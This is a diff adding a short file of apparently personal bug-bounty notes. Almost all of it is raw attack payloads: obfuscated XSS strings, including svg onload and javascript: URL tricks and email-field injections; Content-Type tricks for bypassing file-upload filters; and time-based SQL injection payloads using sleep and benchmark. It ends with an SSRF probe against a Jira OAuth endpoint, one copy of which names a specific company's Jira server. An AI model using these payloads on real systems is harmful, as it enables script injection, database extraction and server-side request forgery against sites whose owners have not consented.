@@ -1,0 +1,45 @@
+Bug Bounty Notes
+
+XSS
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>
+<x>:/1zqjeu;9</SCript><svG/onLoad=prompt(9)>, ;prompt(9);
+Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
+
+http://brutelogic.com.br/poc.svg
+
+
+
+File upload-
+
+Content-Type: application/php
+Content-Type: image/png
+Content-Type: multipart/form-data
+encoding the D in hex
+
+
+
+https://academic.mu.edu/phys/matthysd/web226/Lab01.htm
+
+
+email xss
+<svg/onload=alert(1)>@x.y
+"<svg/onload=alert(1)>"@x.y
+javascript://%250Aalert(1)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+javascript://https://domain.com/%250A1?alert(1):0
+12345678901<svg onload=alert(1)>
+
+
+SQL injection payload
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
+vanilla injection
+/profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/
+
+
+SSEF
+
+jira
+https://<JIRA_BASEPATH>/plugins/servlet/oauth/users/icon-uri?consumerUri=…
+
+https://jira.majesco.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com
